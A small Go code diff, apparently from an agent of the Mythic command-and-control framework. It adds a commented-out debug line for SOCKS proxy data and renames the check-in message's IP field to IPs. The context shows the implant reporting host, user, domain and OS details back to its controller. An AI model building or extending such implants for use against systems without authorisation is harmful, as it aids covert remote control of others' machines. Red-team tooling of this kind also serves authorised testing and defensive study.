@@ -118,6 +118,7 @@ func CreateMythicMessage() *structs.MythicMessage {
 	}
 	if len(SocksArray) > 0 {
 		responseMsg.Socks = &SocksArray
+		//fmt.Printf("sending socks data back to Mythic\n")
 	}
 	return &responseMsg
 }
@@ -133,7 +134,7 @@ func CreateCheckinMessage() interface{} {
 	domain := functions.GetDomain()
 	checkin := structs.CheckInMessage{
 		Action:       "checkin",
-		IP:           currIP,
+		IPs:           currIP,
 		OS:           OperatingSystem,
 		User:         currentUser,
 		Host:         hostname,
